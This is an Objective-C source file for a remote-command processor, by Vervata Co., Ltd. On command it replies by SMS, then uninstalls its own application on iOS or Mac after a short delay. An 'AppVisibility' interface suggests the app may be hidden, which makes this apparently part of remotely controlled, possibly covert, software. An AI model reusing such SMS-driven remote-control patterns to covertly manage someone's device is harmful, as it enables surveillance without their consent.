/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  UnInstallApplicationProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "UnInstallApplicationProcessor.h"
#import "AppContext.h"
#import "AppVisibility.h"

@interface UnInstallApplicationProcessor (PrivateAPI)
- (void) sendReplySMS;
- (void) processUnInstallation;
@end

@implementation UnInstallApplicationProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the UnInstallApplicationProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (UnInstallApplicationProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"UnInstallApplicationProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
		
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the UnInstallApplicationProcessor
 - Argument list and description: No Argument
 - Return description: self(UnInstallApplicationProcessor)
*/

- (void) doProcessingCommand {
	DLog (@"UnInstallApplicationProcessor--->doProcessingCommand")
	[self processUnInstallation];
}


#pragma mark SyncUpdateConfigurationProcessor Private Methods
/**
 - Method name: processUninstallation
 - Purpose:This method is used to process Uninstallation 
 - Argument list and description: No Argument 
 - Return description: No Return Type
 */

- (void) processUnInstallation {
	DLog (@"UnInstallApplicationProcessor--->processSetUpdateConfiguration")
    [self sendReplySMS];
	
	dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        id <AppContext> appContext = [[RemoteCmdUtils sharedRemoteCmdUtils] mAppContext];
        id <AppVisibility> appVisibility = [appContext getAppVisibility];
        #if TARGET_OS_IPHONE
            [NSThread sleepForTimeInterval:30.0];
        
            [appVisibility uninstallApplication];
        #else
            [NSThread sleepForTimeInterval:45.0];
        
            [appVisibility uninstallApplicationMac];
        #endif
    });
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS {
	DLog (@"UnInstallApplicationProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode] andErrorCode:_SUCCESS_];
	NSString *unInstallApplicationMessage=[NSString stringWithFormat:@"%@%@",messageFormat,NSLocalizedString(@"kUnInstallApplication", @"")];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:unInstallApplicationMessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
															   andMessage:unInstallApplicationMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to handle maemory 
 - Argument list and description:No Argument
 - Return description:No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
